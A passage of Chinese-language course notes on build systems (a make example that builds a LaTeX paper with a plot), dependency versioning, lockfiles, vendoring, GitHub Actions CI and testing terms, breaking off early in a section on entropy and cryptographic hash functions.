</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#note-cs-tms-metaprogramming-__codelineno-4-2"></a>make:<span class="w"> </span>***<span class="w"> </span>No<span class="w"> </span>rule<span class="w"> </span>to<span class="w"> </span>make<span class="w"> </span>target<span class="w"> </span><span class="s1">&#39;paper.tex&#39;</span>,<span class="w"> </span>needed<span class="w"> </span>by<span class="w"> </span><span class="s1">&#39;paper.pdf&#39;</span>.<span class="w">  </span>Stop.
</span></code></pre></div>
<p>这告诉我们，<code>make</code> 需要 <code>paper.tex</code> 文件，但是我们没有提供它。我们可以通过执行 <code>touch paper.tex</code> 来创建一个空的 <code>paper.tex</code> 文件，然后再次执行 <code>make</code>。</p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#note-cs-tms-metaprogramming-__codelineno-5-1"></a>$<span class="w"> </span>touch<span class="w"> </span>paper.tex
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#note-cs-tms-metaprogramming-__codelineno-5-2"></a>$<span class="w"> </span>make
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#note-cs-tms-metaprogramming-__codelineno-5-3"></a>make:<span class="w"> </span>***<span class="w"> </span>No<span class="w"> </span>rule<span class="w"> </span>to<span class="w"> </span>make<span class="w"> </span>target<span class="w"> </span><span class="s1">&#39;plot-data.png&#39;</span>,<span class="w"> </span>needed<span class="w"> </span>by<span class="w"> </span><span class="s1">&#39;paper.pdf&#39;</span>.<span class="w">  </span>Stop.
</span></code></pre></div>
我们是有构建 plot-data.png 的规则的，但是这是一条模式规则。因为源文件 data.dat 并不存在，因此 make 就会告诉您它不能构建 plot-data.png，让我们创建这些文件：</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#note-cs-tms-metaprogramming-__codelineno-6-1"></a>$<span class="w"> </span>cat<span class="w"> </span>paper.tex
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#note-cs-tms-metaprogramming-__codelineno-6-2"></a><span class="se">\d</span>ocumentclass<span class="o">{</span>article<span class="o">}</span>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#note-cs-tms-metaprogramming-__codelineno-6-3"></a><span class="se">\u</span>sepackage<span class="o">{</span>graphicx<span class="o">}</span>
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#note-cs-tms-metaprogramming-__codelineno-6-4"></a><span class="se">\b</span>egin<span class="o">{</span>document<span class="o">}</span>
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#note-cs-tms-metaprogramming-__codelineno-6-5"></a><span class="se">\i</span>ncludegraphics<span class="o">[</span><span class="nv">scale</span><span class="o">=</span><span class="m">0</span>.65<span class="o">]{</span>plot-data.png<span class="o">}</span>
</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#note-cs-tms-metaprogramming-__codelineno-6-6"></a><span class="se">\e</span>nd<span class="o">{</span>document<span class="o">}</span>
</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#note-cs-tms-metaprogramming-__codelineno-6-7"></a>$<span class="w"> </span>cat<span class="w"> </span>plot.py
</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#note-cs-tms-metaprogramming-__codelineno-6-8"></a><span class="c1">#!/usr/bin/env python</span>
</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#note-cs-tms-metaprogramming-__codelineno-6-9"></a>import<span class="w"> </span>matplotlib
</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#note-cs-tms-metaprogramming-__codelineno-6-10"></a>import<span class="w"> </span>matplotlib.pyplot<span class="w"> </span>as<span class="w"> </span>plt
</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#note-cs-tms-metaprogramming-__codelineno-6-11"></a>import<span class="w"> </span>numpy<span class="w"> </span>as<span class="w"> </span>np
</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#note-cs-tms-metaprogramming-__codelineno-6-12"></a>import<span class="w"> </span>argparse
</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#note-cs-tms-metaprogramming-__codelineno-6-13"></a>
</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#note-cs-tms-metaprogramming-__codelineno-6-14"></a><span class="nv">parser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>argparse.ArgumentParser<span class="o">()</span>
</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#note-cs-tms-metaprogramming-__codelineno-6-15"></a>parser.add_argument<span class="o">(</span><span class="s1">&#39;-i&#39;</span>,<span class="w"> </span><span class="nv">type</span><span class="o">=</span>argparse.FileType<span class="o">(</span><span class="s1">&#39;r&#39;</span><span class="o">))</span>
</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#note-cs-tms-metaprogramming-__codelineno-6-16"></a>parser.add_argument<span class="o">(</span><span class="s1">&#39;-o&#39;</span><span class="o">)</span>
</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17" href="#note-cs-tms-metaprogramming-__codelineno-6-17"></a><span class="nv">args</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>parser.parse_args<span class="o">()</span>
</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18" href="#note-cs-tms-metaprogramming-__codelineno-6-18"></a>
</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19" href="#note-cs-tms-metaprogramming-__codelineno-6-19"></a><span class="nv">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>np.loadtxt<span class="o">(</span>args.i<span class="o">)</span>
</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20" href="#note-cs-tms-metaprogramming-__codelineno-6-20"></a>plt.plot<span class="o">(</span>data<span class="o">[</span>:,<span class="w"> </span><span class="m">0</span><span class="o">]</span>,<span class="w"> </span>data<span class="o">[</span>:,<span class="w"> </span><span class="m">1</span><span class="o">])</span>
</span><span id="__span-6-21"><a id="__codelineno-6-21" name="__codelineno-6-21" href="#note-cs-tms-metaprogramming-__codelineno-6-21"></a>plt.savefig<span class="o">(</span>args.o<span class="o">)</span>
</span><span id="__span-6-22"><a id="__codelineno-6-22" name="__codelineno-6-22" href="#note-cs-tms-metaprogramming-__codelineno-6-22"></a>$<span class="w"> </span>cat<span class="w"> </span>data.dat
</span><span id="__span-6-23"><a id="__codelineno-6-23" name="__codelineno-6-23" href="#note-cs-tms-metaprogramming-__codelineno-6-23"></a><span class="m">1</span><span class="w"> </span><span class="m">1</span>
</span><span id="__span-6-24"><a id="__codelineno-6-24" name="__codelineno-6-24" href="#note-cs-tms-metaprogramming-__codelineno-6-24"></a><span class="m">2</span><span class="w"> </span><span class="m">2</span>
</span><span id="__span-6-25"><a id="__codelineno-6-25" name="__codelineno-6-25" href="#note-cs-tms-metaprogramming-__codelineno-6-25"></a><span class="m">3</span><span class="w"> </span><span class="m">3</span>
</span><span id="__span-6-26"><a id="__codelineno-6-26" name="__codelineno-6-26" href="#note-cs-tms-metaprogramming-__codelineno-6-26"></a><span class="m">4</span><span class="w"> </span><span class="m">4</span>
</span><span id="__span-6-27"><a id="__codelineno-6-27" name="__codelineno-6-27" href="#note-cs-tms-metaprogramming-__codelineno-6-27"></a><span class="m">5</span><span class="w"> </span><span class="m">8</span>
</span></code></pre></div>
<p>现在我们可以执行 <code>make</code> 来生成 <code>paper.pdf</code> 文件：</p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#note-cs-tms-metaprogramming-__codelineno-7-1"></a>$<span class="w"> </span>make
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#note-cs-tms-metaprogramming-__codelineno-7-2"></a>./plot.py<span class="w"> </span>-i<span class="w"> </span>data.dat<span class="w"> </span>-o<span class="w"> </span>plot-data.png
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#note-cs-tms-metaprogramming-__codelineno-7-3"></a>pdflatex<span class="w"> </span>paper.tex
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#note-cs-tms-metaprogramming-__codelineno-7-4"></a>This<span class="w"> </span>is<span class="w"> </span>pdfTeX,<span class="w"> </span>Version....
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#note-cs-tms-metaprogramming-__codelineno-7-5"></a>...
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#note-cs-tms-metaprogramming-__codelineno-7-6"></a>...
</span></code></pre></div>
现在我们已经得到了 <code>paper.pdf</code> 文件，其中包含了我们的图表。</p>
<p>如果再次执行 <code>make</code>，<code>make</code> 会告诉我们 <code>paper.pdf</code> 是最新的，不需要重新生成。如果我们删除 <code>plot-data.png</code> 文件，再次执行 <code>make</code>，<code>make</code> 会重新生成 <code>plot-data.png</code> 文件，然后再次生成 <code>paper.pdf</code> 文件。事实上也应该这样，因为没有任何东西发生改变，所以 <code>paper.pdf</code> 文件也不应该被重新生成。</p>
<p>如果想要生成其它的图表，可以执行 <code>make plot-something.png</code>，<code>make</code> 会根据规则生成对应的图表。(确保<code>something.data</code>文件存在)</p>
<h2 id="note-cs-tms-metaprogramming-_2">依赖管理<a class="headerlink" href="#note-cs-tms-metaprogramming-_2" title="Permanent link">&para;</a></h2>
<h3 id="note-cs-tms-metaprogramming-_3">版本号<a class="headerlink" href="#note-cs-tms-metaprogramming-_3" title="Permanent link">&para;</a></h3>
<p>对于某些项目，它的依赖本身也有可能是其它的项目。我们也许会依赖某些程序(Python),某些系统包(openssl)或者某些编程语言的库(matplotlib)。这些依赖可能会有不同的版本，而且不同的项目可能会依赖于不同的版本。这就是依赖管理的问题。</p>
<p>由于每个仓库、每种工具的运行机制都不太一样，因此我们并不会在本节课深入讲解具体的细节。我们会介绍一些通用的术语，例如 版本控制。大多数被其他项目所依赖的项目都会在每次发布新版本时创建一个 版本号。通常看上去像 8.1.3 或 64.1.20192004。版本号一般是数字构成的，但也并不绝对。也有可能使用git的commit hash作为版本号。</p>
<p>版本号一个很重要的用途就是它可以保证项目可以运行,试想一下，假如我的库要发布一个新版本，在这个版本里面我重命名了某个函数。如果有人在我的库升级版本后，仍希望基于它构建新的软件，那么很可能构建会失败，因为它希望调用的函数已经不复存在了。有了版本控制就可以很好的解决这个问题，我们可以指定当前项目需要基于某个版本，甚至某个范围内的版本，或是某些项目来构建。这么做的话，即使某个被依赖的库发生了变化，依赖它的软件可以基于其之前的版本进行构建。</p>
<p>但是这还不够好，如果我修复了一写安全上的问题，但是没有更改任何借口（API），同时我也没有增加任何新的功能，但是这也应该是一个新的版本。那么问题就来了，如何去确定什么样的更新应该被认为是一个新的版本呢，换句话说，如何去确定版本与版本之间的区别大小呢？</p>
<p>一套常用的标准是 <a href="https://semver.org/">Semantic Versioning</a>。语义化版本，这个标准定义了版本号的格式以及版本号的含义。一个版本号通常由三个数字构成，分别是 <code>MAJOR.MINOR.PATCH</code>。当我们发布一个新版本时，我们会根据我们的改动来决定如何更新这三个数字：</p>
<ul>
<li>如果我们只是修复了一些 bug，那么我们会更新 <code>PATCH</code> 版本号，（API不改变）</li>
<li>如果我们增加的新的接口，但是不会破坏之前的接口(backward compatible)，那么我们会更新 <code>MINOR</code> 版本号。</li>
<li>如果我们改变了接口(non-backward-compatible)，那么我们会更新 <code>MAJOR</code> 版本号。即彻底改变了某个函数的功能，或者删除了某个函数等等。</li>
</ul>
<p>例如，如果我们的项目依赖某个库的版本是 <code>1.2.3</code>,那么想要运行我们软件的该库的版本号的 <code>MAJOR</code> 版本号必须是 <code>1</code>，<code>MINOR</code> 版本号必须大于等于 <code>2</code>，<code>PATCH</code>版本号任意，但是一般来说高于等于 <code>3</code>。</p>
<p>虽然有可能<code>2.x.x</code>运行也有可能不会报错，但是也有可能会出现一些奇怪的结果。</p>
<p>就像Python2和Python3对于大部分程序是不兼容的，Python3.5能运行的Python3.7也可以运行，但是反过来3.7能运行的3.5就不一定能运行了。因为其可能用到了3.7新增的一些特性。</p>
<h3 id="note-cs-tms-metaprogramming-lockfile">Lockfile<a class="headerlink" href="#note-cs-tms-metaprogramming-lockfile" title="Permanent link">&para;</a></h3>
<p>使用依赖管理系统的时候，也有可能遇到lock files(锁文件)这一概念，其例出了您当前每个依赖所对应的具体版本号</p>
<p>通常需要执行升级程序才能更新以来的版本，这样做有很多好处，例如避免不必要的重新编译，创建可以重现的构建环境，以及避免不必要的更新（Windows的自动更新就经常会导致一些问题）。</p>
<h3 id="note-cs-tms-metaprogramming-vendoring">Vendoring<a class="headerlink" href="#note-cs-tms-metaprogramming-vendoring" title="Permanent link">&para;</a></h3>
<p>还有一种极端的依赖锁定叫做 vendoring。这种方法是将依赖的代码直接复制到项目的源代码中。这样做的好处是，您可以确保您的项目可以在任何情况下构建，即使依赖的项目不再存在，或者依赖的项目发生了变化，甚至可以将自己的修改添加进去。但是这样做也有很多缺点，例如代码冗余，依赖的代码不会自动更新，当开发者更新了一些功能时，你需要自己去拉去这些更新，还可能会导致一些法律问题。</p>
<h2 id="note-cs-tms-metaprogramming-_4">持续集成系统<a class="headerlink" href="#note-cs-tms-metaprogramming-_4" title="Permanent link">&para;</a></h2>
<p>持续集成系统(continous integration systems)是一种自动化的构建系统.</p>
<p>设想这样的场景：你正在开发一个大型项目，你对你的代码修改了一行，接下来，你需要要上传一份新的版本的文档，上传重新编译后的文件到某处，发布代码到pypi，执行测试。</p>
<p>或者你希望当别人提交pull request时，自动运行一些测试，以确保新的代码不会破坏现有的代码。</p>
<p>持续集成系统就是为了解决这些问题而存在的。持续集成系统（aka CI）是一种 <em>雨伞术语</em>（umbrella term，涵盖了一组术语的术语），它指的是“当代码变动时，自动运行的东西”CI 系统通常用于自动化构建、测试和部署流程，以确保代码在提交或合并到版本控制系统时不会破坏现有功能，保证软件质量。</p>
<p>Github Actions就是一个很好的持续集成系统，</p>
<p>是的，<strong>GitHub Actions</strong> 完全属于 <strong>Continuous Integration (CI)</strong> 和 <strong>Continuous Deployment (CD)</strong> 系统的一部分。</p>
<p>GitHub Actions 是 GitHub 提供的一种自动化工具，它允许开发者为他们的项目设置 CI/CD 流程。它可以帮助你自动化代码构建、测试、部署、发布等工作，直接集成在 GitHub 仓库中，因此非常适合 GitHub 用户。</p>
<ol>
<li>
<p>可以使用 GitHub Actions 来创建工作流，当某些事件发生（如推送代码、创建拉取请求等）时，自动触发构建、测试和部署流程。</p>
</li>
<li>
<p>GitHub Actions 使用 YAML 文件来定义工作流，通常是 <code>.github/workflows</code> 目录下的文件。例如，你可以定义一个 CI 工作流来在每次提交代码后自动运行测试。</p>
</li>
<li>
<p>GitHub Actions 可以与其他服务进行集成，如发送通知、上传文件、部署到云平台等。</p>
</li>
<li>
<p>还可以通过多种事件来触发工作流，包括：</p>
</li>
<li><strong>push</strong>：当代码被推送到仓库时触发。</li>
<li><strong>pull_request</strong>：当有拉取请求时触发。</li>
<li><strong>issue</strong>：当创建、修改或关闭一个 issue 时触发。</li>
<li><strong>schedule</strong>：按预定的时间表触发（类似 cron 作业）。</li>
<li><strong>release</strong>：当发布版本时触发。</li>
</ol>
<h3 id="note-cs-tms-metaprogramming-ci-githubworkflowsciyml">一个简单的 CI 工作流（在 <code>.github/workflows/ci.yml</code> 文件中）：<a class="headerlink" href="#note-cs-tms-metaprogramming-ci-githubworkflowsciyml" title="Permanent link">&para;</a></h3>
<div class="language-yaml highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#note-cs-tms-metaprogramming-__codelineno-8-1"></a><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">CI Workflow</span>
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#note-cs-tms-metaprogramming-__codelineno-8-2"></a>
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#note-cs-tms-metaprogramming-__codelineno-8-3"></a><span class="nt">on</span><span class="p">:</span>
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#note-cs-tms-metaprogramming-__codelineno-8-4"></a><span class="w">  </span><span class="nt">push</span><span class="p">:</span>
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#note-cs-tms-metaprogramming-__codelineno-8-5"></a><span class="w">    </span><span class="nt">branches</span><span class="p">:</span>
</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#note-cs-tms-metaprogramming-__codelineno-8-6"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">main</span>
</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#note-cs-tms-metaprogramming-__codelineno-8-7"></a><span class="w">  </span><span class="nt">pull_request</span><span class="p">:</span>
</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#note-cs-tms-metaprogramming-__codelineno-8-8"></a><span class="w">    </span><span class="nt">branches</span><span class="p">:</span>
</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#note-cs-tms-metaprogramming-__codelineno-8-9"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">main</span>
</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#note-cs-tms-metaprogramming-__codelineno-8-10"></a>
</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#note-cs-tms-metaprogramming-__codelineno-8-11"></a><span class="nt">jobs</span><span class="p">:</span>
</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#note-cs-tms-metaprogramming-__codelineno-8-12"></a><span class="w">  </span><span class="nt">build</span><span class="p">:</span>
</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#note-cs-tms-metaprogramming-__codelineno-8-13"></a><span class="w">    </span><span class="nt">runs-on</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ubuntu-latest</span>
</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#note-cs-tms-metaprogramming-__codelineno-8-14"></a>
</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#note-cs-tms-metaprogramming-__codelineno-8-15"></a><span class="w">    </span><span class="nt">steps</span><span class="p">:</span>
</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#note-cs-tms-metaprogramming-__codelineno-8-16"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Checkout code</span>
</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17" href="#note-cs-tms-metaprogramming-__codelineno-8-17"></a><span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">actions/checkout@v2</span>
</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18" href="#note-cs-tms-metaprogramming-__codelineno-8-18"></a>
</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19" href="#note-cs-tms-metaprogramming-__codelineno-8-19"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Set up Python</span>
</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20" href="#note-cs-tms-metaprogramming-__codelineno-8-20"></a><span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">actions/setup-python@v2</span>
</span><span id="__span-8-21"><a id="__codelineno-8-21" name="__codelineno-8-21" href="#note-cs-tms-metaprogramming-__codelineno-8-21"></a><span class="w">        </span><span class="nt">with</span><span class="p">:</span>
</span><span id="__span-8-22"><a id="__codelineno-8-22" name="__codelineno-8-22" href="#note-cs-tms-metaprogramming-__codelineno-8-22"></a><span class="w">          </span><span class="nt">python-version</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">3.9</span>
</span><span id="__span-8-23"><a id="__codelineno-8-23" name="__codelineno-8-23" href="#note-cs-tms-metaprogramming-__codelineno-8-23"></a>
</span><span id="__span-8-24"><a id="__codelineno-8-24" name="__codelineno-8-24" href="#note-cs-tms-metaprogramming-__codelineno-8-24"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Install dependencies</span>
</span><span id="__span-8-25"><a id="__codelineno-8-25" name="__codelineno-8-25" href="#note-cs-tms-metaprogramming-__codelineno-8-25"></a><span class="w">        </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">|</span>
</span><span id="__span-8-26"><a id="__codelineno-8-26" name="__codelineno-8-26" href="#note-cs-tms-metaprogramming-__codelineno-8-26"></a><span class="w">          </span><span class="no">python -m pip install --upgrade pip</span>
</span><span id="__span-8-27"><a id="__codelineno-8-27" name="__codelineno-8-27" href="#note-cs-tms-metaprogramming-__codelineno-8-27"></a><span class="w">          </span><span class="no">pip install -r requirements.txt</span>
</span><span id="__span-8-28"><a id="__codelineno-8-28" name="__codelineno-8-28" href="#note-cs-tms-metaprogramming-__codelineno-8-28"></a>
</span><span id="__span-8-29"><a id="__codelineno-8-29" name="__codelineno-8-29" href="#note-cs-tms-metaprogramming-__codelineno-8-29"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Run tests</span>
</span><span id="__span-8-30"><a id="__codelineno-8-30" name="__codelineno-8-30" href="#note-cs-tms-metaprogramming-__codelineno-8-30"></a><span class="w">        </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">|</span>
</span><span id="__span-8-31"><a id="__codelineno-8-31" name="__codelineno-8-31" href="#note-cs-tms-metaprogramming-__codelineno-8-31"></a><span class="w">          </span><span class="no">pytest</span>
</span></code></pre></div>
<p>在这个示例中，GitHub Actions 会在每次推送或拉取请求到 <code>main</code> 分支时，自动触发以下步骤：
1. 检出代码（<code>actions/checkout@v2</code>）。
2. 设置 Python 环境（<code>actions/setup-python@v2</code>）。
3. 安装项目的依赖。
4. 运行测试。</p>
<h3 id="note-cs-tms-metaprogramming-_5">测试<a class="headerlink" href="#note-cs-tms-metaprogramming-_5" title="Permanent link">&para;</a></h3>
<p>多数的大型软件都有“测试套件”，以下是一些常见的测试方法和测试术语：</p>
<ul>
<li>测试套件（Test suite）：所有测试的统称。</li>
<li>单元测试（Unit test）：一种“微型测试”，用于对某个封装的特性进行测试。</li>
<li>集成测试（Integration test）：一种“宏观测试”，针对系统的某一大部分进行，测试其不同的特性或组件是否能 协同 工作。</li>
<li>回归测试（Regression test）：一种实现特定模式的测试，用于保证之前引起问题的 bug 不会再次出现。</li>
<li>模拟（Mocking）: 使用一个假的实现来替换函数、模块或类型，屏蔽那些和测试不相关的内容。例如，您可能会“模拟网络连接” 或 “模拟硬盘”。</li>
</ul></section><section class="print-page" id="note-cs-tms-security-and-cryptography" heading-number="2.4.2.8"><h1 id="note-cs-tms-security-and-cryptography-security-and-cryptography">Security and Cryptography<a class="headerlink" href="#note-cs-tms-security-and-cryptography-security-and-cryptography" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 2287 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 9 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 8 分钟</p>
</div>
<p>本次lecture主要介绍了一些安全方面的基础知识，进行一些简单但是实用的说明。</p>
<h2 id="note-cs-tms-security-and-cryptography-entropy">熵(ENTROPY)<a class="headerlink" href="#note-cs-tms-security-and-cryptography-entropy" title="Permanent link">&para;</a></h2>
<p>熵是一个系统的不确定性的度量。在密码学中，熵是一个密码系统的随机性的度量。熵越高，密码系统越难破解。</p>
<p>熵的单位是比特(bit)。其大小等于<span class="arithmatex">\(\log_2 (n)\)</span>,其中<span class="arithmatex">\(n\)</span>是密码系统的可能状态数。</p>
<p>比如说投掷一个骰子，那么熵就是<span class="arithmatex">\(\log_2 6 = 2.58\)</span> bit。</p>
<p>还有一个信息熵的概念，是一个信源的平均信息量。信息熵越高，信息量越大。</p>
<p>定义为<span class="arithmatex">\(H(X) = -\sum_{i=1}^n p(x_i) \log_2 p(x_i)\)</span>，其中<span class="arithmatex">\(p(x_i)\)</span>是信源输出<span class="arithmatex">\(x_i\)</span>的概率。亦即<span class="arithmatex">\(\log_2 p_i\)</span>的期望。</p>
<h2 id="note-cs-tms-security-and-cryptography-_1">散列函数<a class="headerlink" href="#note-cs-tms-security-and-cryptography-_1" title="Permanent link">&para;</a></h2>
<p>密码散列函数(Cryptographic Hash Function)是一种将任意长度的输入数据映射为固定长度的输出数据的函数。</p>
<p>其大致的规范如下
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-cs-tms-security-and-cryptography-__codelineno-0-1"></a>hash(value: array&lt;byte&gt;) -&gt; vector&lt;byte, N&gt;  (N对于该函数固定)
</span></code></pre></div></p>
<p><code>SHA-1</code> 是 Git 中使用的一种散列函数， 它可以将任意大小的输入映射为一个 <code>160</code> 比特（可被 <code>40</code> 位十六进制数表示）的输出。 可以使用sha1sum命令来计算文件的sha1值。</p>
<p>例如：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-cs-tms-security-and-cryptography-__codelineno-1-1"></a>$<span class="w"> </span><span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;hello&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sha1sum
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-cs-tms-security-and-cryptography-__codelineno-1-2"></a>aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d<span class="w">  </span>-
</span></code></pre></div></p>
<p>如果使用<code>echo "hello"</code>,会发现结果居然不一样，这是因为<code>echo</code>会在输出后加上一个换行符。</p>
<p>抽象地讲，散列函数可以被认为是一个不可逆，而且看上去随机的函数，其具有以下的特点</p>
<ul>
<li>确定性： 对于不变的输入永远有相同的输出</li>
<li>不可逆性：<span class="arithmatex">\(hash(i)=o\)</span>,几乎不可能只通过<span class="arithmatex">\(o\)</span>来找到<span class="arithmatex">\(i\)</span></li>
<li>目标碰撞抵抗性：对于给定的输入，找到一个不同的输入，使得他们的hash值相同，是困难的</li>
<li>碰撞抵抗性：即使不要求输入给定，任意寻找两个不同的输入，使得他们的hash值相同，也是困难的（这一性质强于目标碰撞抵抗性）</li>
</ul>
<h3 id="note-cs-tms-security-and-cryptography-_2">应用<a class="headerlink" href="#note-cs-tms-security-and-cryptography-_2" title="Permanent link">&para;</a></h3>
<ul>
<li>Git中的内容寻址存储</li>
<li>文件的信息摘要：可以用来验证文件的正确性，例如下载镜像文件时，可以通过计算这个文件的hash值，与官网上的hash值进行比对，来验证文件的完整性以及正确性。</li>
